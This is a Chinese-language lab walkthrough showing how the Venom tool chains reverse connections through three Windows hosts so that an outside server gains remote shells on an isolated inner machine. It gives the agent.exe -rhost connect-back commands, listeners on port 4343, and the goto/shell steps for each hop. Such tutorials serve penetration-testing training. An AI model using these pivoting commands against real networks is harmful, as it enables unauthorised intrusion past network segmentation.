# 二、穿透内网

Venom可连接节点，然后以节点为跳板，构建多级代//理。

实验环境：

1.服务器 IP：x.x.x.x

2.内网的机器三台windows IP地址：192.168.3.160、192.168.3.15、192.168.3.30

3.设想服务器要访问最里面的192.168.3.160只能一层一层的依次访问；192.168.3.160只能和192.168.3.30相互访问；192.168.3.30可以和192.168.3.15，192.168.3.160访问而不能访问服务器；最后3.15能被服务器访问，也能和3.30相互访问；利用Venom来进行一层一层的代理实现内网穿透；  
![](../Images/43e75ed14ec68353b6e89b4467304b72.png)

实验开始

1.将下载好的Venom工具依次上传到对应的机器里面，服务器上面上传admin\_linux\_x64，并修改权限 chmod 777 admin\_linux\_x64  
![](../Images/d68eacbd19079c15ea07054a66a84750.png)  
2、使用./admin\_linux\_x64文件来监听本地端口，内网的机器就是用agent.exe文件来连接服务器。服务器执行命令./admin\_linux\_x64 -lport 4343，监听本地4343端口  
![](../Images/d4d8f61f4c0b846d4a7569257f5af84b.png)  
3、所有机器都已经上传了Venom工具包并解压，环境都是windows；在192.168.3.15机器上面执行连接操作；执行命令agent.exe -rhost 120.10.120.X -rport 4343  
![](../Images/3c71bbfe35b8255505395ed7c5e7295c.png)  
服务器监听成功，192.168.3.15被监听：  
![](../Images/2a9d944d5c6076d43fa07e6282685136.png)  
4、然后在服务器上进行操作；help查看命令。这里我们要使用到show，goto，listen，exit，shell这几个命令；

① 执行show命令，可以看见刚刚连接成功的一个节点；  
![](../Images/114f737756313374a8ff0a1f6983b53e.png)  
② goto 1可以切换到1节点上面去  
![](../Images/a4977f82af2b9e552f54235c24ec1651.png)  
③shell 执行命令  
![](../Images/44298c8b0f7f52a94bea9575045c529f.png)  
④exit 退出，进行下一步的监听操作。在不退出1节点的基础上面执行listen 4343端口进行监听本地端口  
![](../Images/582bf70a1c3522081356b8cc95ab7c7f.png)  
5、在第二台内网主机192.168.3.30机器上面执行命令：

```

agent.exe -rhost 192.168.3.15 -rport 4343
```

*   1
    

![](../Images/99ef91e45616dad0e4d445c4d710f3a3.png)  
6\. 此时服务器成功跨越192.168.3.15连接到192.168.3.30。

①执行show命令发现新增了一个节点；  
![](../Images/1d984e98d80139afda6e010537ad73fe.png)  
②切换到节点2中: goto 2 。执行命令：shell  
![](../Images/af96eaf518b2c9847938db23f5e77815.png)  
7.现在进行最后一步实验：VPS服务器穿透192.168.3.15\\192.168.3.30 连接到最内层192.168.3.160；依次执行命令exit，listen 4343 ；192.168.3.30机器开启本地监听：  
![](../Images/9a8db9badf0b26925908a2fbb682f017.png)  
①在192.168.3.160机器上面进行连接操作，执行命令：

```

agent.exe -rhost 192.168.3.30 -rport 4343
```

*   1
    

![](../Images/fc5e17dc65666c582353b4f57209986d.png)  
②服务器>show；成功建立监听  
![](../Images/d9f5d311775b29444e0a382c9669a525.png)  
③goto 3 切换到3节点。shell 执行命令。至此内网穿透实验成功  
![](../Images/23ffc02028e034f9d3dcf00c65ddfc5f.png)
